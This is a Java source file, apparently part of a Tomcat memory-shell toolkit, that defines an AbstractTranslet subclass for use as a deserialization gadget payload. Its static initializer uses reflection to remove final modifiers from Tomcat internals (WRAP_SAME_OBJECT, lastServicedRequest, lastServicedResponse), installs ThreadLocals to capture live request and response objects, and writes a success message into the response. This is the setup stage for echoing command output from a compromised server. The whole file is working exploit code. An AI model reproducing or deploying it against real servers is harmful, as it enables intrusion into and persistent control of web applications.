package Tomcat_Echo_memShell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class Tomcat_Echo_inject_ThreadLocal extends AbstractTranslet {

    static {
        try {

            //反射获取所需属性
            java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            java.lang.reflect.Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            //使用modifiersField反射修改final型变量
            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            //将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量
            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) {
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            }

            if (lastServicedRequestField.get(null) == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
            }

            if (lastServicedResponseField.get(null) == null) {
                lastServicedResponseField.set(null, new ThreadLocal<>());
            }


            //获取response变量
            if (lastServicedResponseField.get(null) != null) {
                ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null);
                ServletResponse servletResponse = (ServletResponse) threadLocal.get();
                PrintWriter writer = servletResponse.getWriter();
                writer.write("Inject ThreadLocal Successfully!");
                writer.flush();
                writer.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
